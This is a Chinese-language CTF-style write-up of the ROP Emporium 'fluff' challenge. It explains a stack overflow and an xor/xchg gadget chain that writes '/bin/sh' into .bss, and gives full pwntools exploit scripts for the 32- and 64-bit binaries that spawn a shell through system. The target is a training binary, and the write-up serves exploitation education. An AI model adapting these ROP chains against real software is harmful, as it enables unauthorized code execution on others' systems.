---
title: ROP Emporium の fluff
date: 2020-06-10 09:35:57
categories:
- WriteUPs
- ROP Emporium
tags:
- PWN
- ROP
- Stack
---
## Introduction

[ROP Emporium](https://ropemporium.com)训练5：fluff的解析。

<!-- more -->

## fluff32

### Step 1

程序正常运行截图：

![](/img/fluff/fluff1.png)

checksec：

![](/img/fluff/fluff2.png)

### Step 2

依然是pwnme中fgets函数存在溢出：

![](/img/fluff/fluff3.png)

虽然程序中有system函数，但是没有可利用的字符串：

![](/img/fluff/fluff4.png)

所以需要向内存中写入需要的字符串，再找一下可以实现目标的指令段：

![](/img/fluff/fluff5.png)

也没有可以利用的指令段，似乎陷入死局？

### Step 3

其实还是有一条路可以走的，在[XMAN level3 の Write-Up](https://coldwave96.github.io/2020/05/20/XMAN-level3/)中我们通过泄露writes函数在got表上的地址得到libc的基地址，然后通过libc中的字符串getshell。这里我们依然可以使用ret2libc技术，泄露puts函数在got表上的地址，获取libc的基地址，然后用这个基地址加上’/bin/sh’在libc中的offset，调用system函数getshell。

但是根据题目的叙述，似乎是在让我们尝试强行写入需要的字符串，那我们只能回到程序，再仔细的找找可用的gadget了。

不妨逆向思维倒推一下，我们需要写内存的操作，那么肯定要mov [reg]，reg；ret的结构：

![](/img/fluff/fluff6.png)

这个函数是可以实现，首先考虑控制写入的地址，那么往前推我们需要控制ecx寄存器，给ecx赋值：

![](/img/fluff/fluff7.png)

xchg指令是交换两个寄存器的值，那么从上面的函数中截取部分是可以实现给ecx赋值的，但是我们就要改为控制edx寄存器：

![](/img/fluff/fluff8.png)

* 这段指令会将edx和ebx异或的值放入edx。所以我们需要pop edx；xor ebx，ebx；或者pop ebx；xor edx，edx；（A异或0仍为A）

![](/img/fluff/fluff9.png)

所以还需要pop ebx；ret：

![](/img/fluff/fluff10.png)

完美，前半部分控制内存地址的ropchain已经补充完成。下面是控制字符串的写入，也是从sub_8048692函数开始，倒推需要控制edx。

依然没有直接pop edx的指令，只能选择间接的xor edx，ebx；

和上面一样需要pop edx；xor ebx，ebx；或者pop ebx；xor edx，edx；

于是回到上面的sub_8048670函数，最后依然是pop ebx；ret；

最终实现控制写入的字符串，下面做一个草图帮助一下理解以及EXP的编写：

![](/img/fluff/fluff11.png)

### Step 4

最后就是EXP的编写：

```Python
* from pwn import *
* 
* sh = process('./fluff32')
* elf = ELF('./fluff32')
* 
* pop_ebx_addr = 0x080483e1
* xor_edx_edx_addr = 0x08048671
* xor_edx_ebx_addr = 0x0804867b
* xchg_addr = 0x08048689
* mov_addr = 0x08048693
* 
* bss_addr = 0x0804a040
* sys_addr = elf.symbols['system']
* 
* def mov_data(string, addr):
*     payload = p32(pop_ebx_addr) + p32(addr)
*     payload += p32(xor_edx_edx_addr) + p32(0xdeadbeef)
*     payload += p32(xor_edx_ebx_addr) + p32(0xdeadbeef)
*     payload += p32(xchg_addr) + p32(0xdeadbeef)
*     payload += p32(pop_ebx_addr) + string
*     payload += p32(xor_edx_edx_addr) + p32(0xdeadbeef)
*     payload += p32(xor_edx_ebx_addr) + p32(0xdeadbeef)
*     payload += p32(mov_addr) + p32(0xdeadbeef) + p32(0)
*     return payload
* 
* payload = 'a' * (0x28 + 0x4)
* payload += mov_data('/bin', bss_addr)
* payload += mov_data('/sh\x00', bss_addr + 4)
* payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr)
* 
* sh.recvuntil('>')
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

EXP运行结果：

![](/img/fluff/fluff12.png)

## fluff

像32位程序一样寻找完整的ROP Chain：

![](/img/fluff/fluff13.png)

加上控制r12寄存器的指令段：

![](/img/fluff/fluff14.png)

以及调用system函数传参的时候需要控制rdi寄存器：

![](/img/fluff/fluff15.png)

万事俱备，直接给出EXP脚本：

```Python
* from pwn import *
* 
* sh = process('./fluff')
* elf = ELF('./fluff')
* 
* bss_addr = 0x601060
* sys_addr = elf.symbols['system']
* 
* mov_addr = 0x40084e
* xchg_addr = 0x400840
* xor_r11_r12_addr = 0x40082f
* xor_r11_r11_addr = 0x400822
* pop_addr = 0x4008bc
* 
* pop_rdi_addr = 0x4008c3
* 
* payload = 'a' * (0x20 + 0x8)
* payload += p64(pop_addr) + p64(bss_addr) + p64(0) + p64(0) + p64(0)
* payload += p64(xor_r11_r11_addr) + p64(0)
* payload += p64(xor_r11_r12_addr) + p64(0)
* payload += p64(xchg_addr) + p64(0)
* 
* payload += p64(pop_addr) + '/bin/sh\x00' + p64(0) + p64(0) + p64(0)
* payload += p64(xor_r11_r11_addr) + p64(0)
* payload += p64(xor_r11_r12_addr) + p64(0)
* payload += p64(mov_addr) + p64(0) + p64(0)
* 
* payload += p64(pop_rdi_addr) + p64(bss_addr)
* 
* payload += p64(sys_addr)
* 
* sh.recvuntil('>')
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

EXP运行结果：

![](/img/fluff/fluff16.png)